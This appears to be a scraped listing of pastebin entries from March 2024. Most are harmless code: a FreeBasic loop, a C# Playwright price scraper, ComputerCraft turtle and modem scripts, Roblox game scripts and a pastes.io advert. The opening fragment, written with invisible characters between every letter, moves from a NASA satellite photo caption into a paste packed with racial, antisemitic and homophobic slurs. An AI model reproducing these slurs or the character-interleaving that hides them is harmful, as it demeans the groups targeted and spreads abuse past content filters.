‎r‎e‎-‎e‎n‎t‎e‎r‎e‎d‎ ‎t‎h‎e‎ ‎E‎a‎r‎t‎h‎'‎s‎ ‎a‎t‎m‎o‎s‎p‎h‎e‎r‎e‎ ‎d‎u‎r‎i‎n‎g‎ ‎t‎h‎e‎ ‎f‎o‎l‎l‎o‎w‎i‎n‎g‎ ‎d‎e‎c‎a‎d‎e‎.‎ ‎T‎h‎i‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎s‎h‎o‎w‎s‎ ‎a‎ ‎t‎e‎s‎t‎ ‎i‎n‎f‎l‎a‎t‎i‎o‎n‎ ‎o‎f‎ ‎a‎ ‎P‎A‎G‎E‎O‎S‎ ‎s‎a‎t‎e‎l‎l‎i‎t‎e‎ ‎i‎n‎ ‎a‎ ‎b‎l‎i‎m‎p‎ ‎h‎a‎n‎g‎a‎r‎ ‎a‎t‎ ‎W‎e‎e‎k‎s‎v‎i‎l‎l‎e‎,‎ ‎N‎o‎r‎t‎h‎ ‎C‎a‎r‎o‎l‎i‎n‎a‎,‎ ‎i‎n‎ ‎1‎9‎6‎5‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎N‎A‎S‎A‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

B‎y‎e‎,‎ ‎g‎u‎y‎s‎.‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎p‎l‎a‎y‎ ‎t‎h‎e‎ ‎f‎l‎u‎t‎e‎ ‎i‎n‎ ‎f‎r‎o‎n‎t‎ ‎o‎f‎ ‎a‎n‎ ‎I‎n‎d‎i‎a‎n‎ ‎p‎e‎r‎s‎o‎n‎.‎ ‎I‎f‎ ‎t‎h‎a‎t‎ ‎w‎a‎s‎n‎'‎t‎ ‎o‎f‎f‎e‎n‎s‎i‎v‎e‎ ‎e‎n‎o‎u‎g‎h‎,‎ ‎f‎u‎c‎k‎ ‎y‎o‎u‎.‎ ‎S‎o‎m‎e‎t‎i‎m‎e‎s‎,‎ ‎I‎ ‎j‎u‎s‎t‎ ‎l‎i‎k‎e‎ ‎t‎o‎ ‎p‎l‎a‎y‎ ‎t‎h‎e‎ ‎f‎l‎u‎t‎e‎,‎ ‎y‎o‎u‎ ‎f‎u‎c‎k‎i‎n‎g‎ ‎n‎i‎g‎g‎e‎r‎ ‎s‎p‎i‎c‎ ‎k‎i‎k‎e‎ ‎c‎h‎i‎n‎k‎ ‎c‎u‎n‎t‎ ‎J‎e‎w‎i‎s‎h‎ ‎n‎i‎g‎g‎e‎r‎ ‎m‎o‎n‎k‎e‎y‎ ‎f‎a‎g‎g‎o‎t‎ ‎a‎s‎s‎ ‎p‎i‎r‎a‎t‎e‎ ‎f‎u‎d‎g‎e‎ ‎p‎a‎c‎k‎i‎n‎g‎ ‎s‎p‎i‎c‎ ‎p‎i‎s‎s‎ ‎d‎r‎i‎n‎k‎i‎n‎g‎ ‎n‎i‎g‎g‎e‎r‎!‎"
rtca81qY,Mad,Unknown_No_1,PHP,Sunday 24th of March 2024 08:51:45 PM CDT,HappyHoliByMadGamerTG
URF5trpt,Untitled,retroman,FreeBasic,Sunday 24th of March 2024 08:50:44 PM CDT,"dim strings(6) as string = {""abc"",""abcd"",""abcde"",""abcdef"",""abcdefg"",""abcdefgh""}

	for i as integer = 0 to 5 step 1
		for j as integer = 5 to 0 step -1
			if len(strings(i)) < len(strings(j)) then
				print ""the longest string is: ""; j
				end
			end if
		next
	next
sleep"
vmW7wgKb,Pastes.io [Pastebin Alternative],xxsa,PHP,Sunday 24th of March 2024 08:36:29 PM CDT,"https://pastes.io - #1 Pastebin Alternative - its free.

Pastes.io is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

Simple Ads by Google Adsense Few rather than Pastebin
150+ different syntax languages - All Free
Paste Folders
Load files feature
Password protected pastes
Encrypted pastes.
URL Shortener.
Unlisted pastes.
Private pastes.
Embed, download, print pastes.
Socialite (Facebook/Twitter/Google Social login)
Trending pastes page (day, week, month, year)
Encrypted pastes.x
Trending pastes page (day, week, month, year).
No Captcha for logged in users feature.
.."
80RdFS6k,Untitled,dereksir,C#,Sunday 24th of March 2024 08:30:49 PM CDT,"using Microsoft.Playwright;
using System.Threading.Tasks;

class Program
{
    static async Task Main(string[] args)
    {
        // launch Playwright
        using var playwright = await Playwright.CreateAsync();

        // launch Chromium browser
        await using var browser = await playwright.Chromium.LaunchAsync(new BrowserTypeLaunchOptions { Headless = true });

        // create a new page
        var page = await browser.NewPageAsync();

        // navigate to the scrapeme website
        await page.GotoAsync(""https://scrapeme.live/shop/Pikachu/"");

        // extract the product price
        var priceElement = await page.QuerySelectorAsync(""#product-752 > div.summary.entry-summary > p.price > span"");
        var productPrice = await priceElement.InnerTextAsync();

        // print the product price
        Console.WriteLine($""Product Price: {productPrice}"");

        // close the browser
        await browser.CloseAsync();
    }
}"
hjhBDB1x,shipbuild,ChickenSquiggles,Lua,Sunday 24th of March 2024 08:20:33 PM CDT,"turtle.select(16)
turtle.refuel()

for i=1,3 do
    turtle.up()
end

turtle.select(3)
turtle.placeDown()
turtle.back()
turtle.placeDown()
turtle.forward()
turtle.forward()
turtle.placeDown()
turtle.back()
turtle.turnLeft()
turtle.forward()
turtle.placeDown()
turtle.back()
turtle.back()
turtle.placeDown()

turtle.select(2)

turtle.turnLeft()
turtle.forward()
turtle.placeDown()
turtle.back()
turtle.back()
turtle.placeDown()
turtle.turnRight()
turtle.forward()
turtle.forward()
turtle.placeDown()
turtle.turnLeft()
turtle.forward()
turtle.forward()
turtle.placeDown()

turtle.select(1)

turtle.back()
turtle.turnLeft()
turtle.forward()
turtle.turnRight()
turtle.place()"
BkFdvGdv,Miner Remote,Alexr360,Lua,Sunday 24th of March 2024 08:10:13 PM CDT,"local function clearScreen()
  term.clear()
  term.setCursorPos(1, 1)
end

-- Function to check the GPS y-coordinate
local function checkYCoordinate()
    -- Get the current GPS location
    local x, y, z = gps.locate(2, false)

    -- Check if the GPS location was successfully obtained
    if x and y and z then
        clearScreen()
        -- Check if the y-coordinate is below -55
        if y < -55 then
            print(""The y-coordinate is below -55."")

            local modem = peripheral.find(""modem"") or error(""No modem attached"", 0)
			modem.open(43) -- Open 43 so we can receive replies

			modem.transmit(92, 43, ""Retract"")
            return true  -- Exit the loop
        else
            print(""The y-coordinate is "" .. y)
            return false  -- Continue the loop
        end
    else
        print(""GPS location not found."")
        return false  -- Continue the loop
    end
end

-- Main loop to continuously check the y-coordinate
while not checkYCoordinate() do
    os.sleep(1)  -- Wait for 1 second before checking again
end
"
8pF6ds3s,Bastion Remote Force,Alexr360,Lua,Sunday 24th of March 2024 07:47:48 PM CDT,"local function clearScreen()
  term.clear()
  term.setCursorPos(1, 1)
end

local modem = peripheral.find(""modem"") or error(""No modem attached"", 0)
modem.open(43) -- Open 43 so we can receive replies

-- Send our message
print(""Enter your message:"")
local userMessage = read()
modem.transmit(15, 43, userMessage)

-- And wait for a reply
local event, side, channel, replyChannel, message, distance
repeat
  event, side, channel, replyChannel, message, distance = os.pullEvent(""modem_message"")
until channel == 43

clearScreen()

print(tostring(message))"
wxBeL5ZT,FNaF Part 5: Updated Left Door Script,qaltx,Lua,Sunday 24th of March 2024 07:44:46 PM CDT,"db = false
door = false
light = false

local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local Values = ReplicatedStorage.Values

script.Parent.LightButton.ClickDetector.MouseClick:Connect(function()
	if not db then db = true
		if not light then light = true
			Values.Power.Usage.Value += 1
			script.Parent.Dark.Transparency = 1
			script.Parent.LightButton.BrickColor = BrickColor.new(""Cool yellow"")
			db = false
		elseif light then
			Values.Power.Usage.Value -= 1
			script.Parent.Dark.Transparency = 0
			script.Parent.LightButton.BrickColor = BrickColor.new(""Dark stone grey"")
			db = false light = false
		end
	end
end)
script.Parent.DoorButton.ClickDetector.MouseClick:connect(function()
	if not db then db = true
		if not door then door = true
			Values.Power.Usage.Value += 1
			script.Parent.DoorButton.BrickColor = BrickColor.new(""Lime green"")
			for i=0,15 do
				script.Parent.Door.CFrame = script.Parent.Door.CFrame - Vector3.new(0,0.8,0)
				wait()
			end
			script.Parent.Door.CFrame = script.Parent.Door.CFrame - Vector3.new(0,0.2,0)
			db = false
		elseif door then door = false
			Values.Power.Usage.Value -= 1
			script.Parent.DoorButton.BrickColor = BrickColor.new(""Really red"")
			for i=0,15 do
				script.Parent.Door.CFrame = script.Parent.Door.CFrame + Vector3.new(0,0.8,0)
				wait()
			end
			script.Parent.Door.CFrame = script.Parent.Door.CFrame + Vector3.new(0,0.2,0)
			db = false
		end
	end
end)"
VgESdSe9,FNaF Part 5: Updated Camera Script,qaltx,Lua,Sunday 24th of March 2024 07:43:21 PM CDT,"local Player = game.Players.LocalPlayer
local Char = Player.CharacterAdded
local buttons = script.Parent.Buttons
local cams = workspace.CurrentCamera
local btn = script.Parent.Parent.View.CameraButton

local Cameras = workspace:WaitForChild(""Cameras"")
local tweenService = game:GetService(""TweenService"")

local views = workspace:WaitForChild(""Views"")
local soundCamera = workspace:WaitForChild(""Sounds""):WaitForChild(""CameraSound"")
local soundTransition = workspace:WaitForChild(""Sounds""):WaitForChild(""CameraTransition"")

local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local Values = ReplicatedStorage.Values

local viewUI = script.Parent.Parent.View

-- // buttons view
local viewMain = viewUI.MainView
local viewRight = viewUI.RightView
local viewLeft = viewUI.LeftView

db = false
camera = false

function tweenCamera(pos,tweenTime)
	tweenService:Create(cams,TweenInfo.new(tweenTime,Enum.EasingStyle.Linear),{CFrame = pos.CFrame}):Play()
end
btn.MouseEnter:Connect(function()
	if not db then db = true
		if not camera then camera = true
			script.Parent.Parent.Cameras.Enabled = true
			wait(0.05)
			soundCamera:Play()
			wait(0.1)
			soundTransition:Play()
			buttons.Visible = true

			viewMain.Visible = false
			viewRight.Visible = false
			viewLeft.Visible = false
			
			Values.Power.Usage.Value += 1
			tweenCamera(Cameras.Camera1.Camera,0)
			db = false
		elseif camera then camera = false
			script.Parent.Parent.Cameras.Enabled = false
			soundCamera:Stop()
			buttons.Visible = false

			viewMain.Visible = true
			viewRight.Visible = true
			viewLeft.Visible = true
			
			Values.Power.Usage.Value -= 1
			tweenCamera(views.ViewMain,0)
			db = false
		end
	end
end)"
FddxsAqr,Miner Control,Alexr360,Lua,Sunday 24th of March 2024 07:42:51 PM CDT,"local function clearScreen()
  term.clear()
  term.setCursorPos(1, 1)
end

-- Set the side of the computer where the redstone signal will be emitted (change 'back' if needed)
local side = ""back""

redstone.setOutput(side, true)

-- Prompt the player to press enter to start
print(""Press Enter to start emitting the redstone signal."")
while true do
  local event, key = os.pullEvent(""key"")
  if event == ""key"" and key == keys.enter then
    break
  end
end

clearScreen()

-- Activate the redstone output
redstone.setOutput(side, false)
print(""Redstone signal activated."")

local modem = peripheral.find(""modem"") or error(""No modem attached"", 0)
modem.open(92) -- Open 43 so we can receive replies

-- And wait for a reply
local event, side, channel, replyChannel, message, distance
repeat
    event, side, channel, replyChannel, message, distance = os.pullEvent(""modem_message"")
until channel == 92

-- Deactivate the redstone output after the duration
redstone.setOutput(side, true)
print(""Redstone signal deactivated."")
os.reboot()"
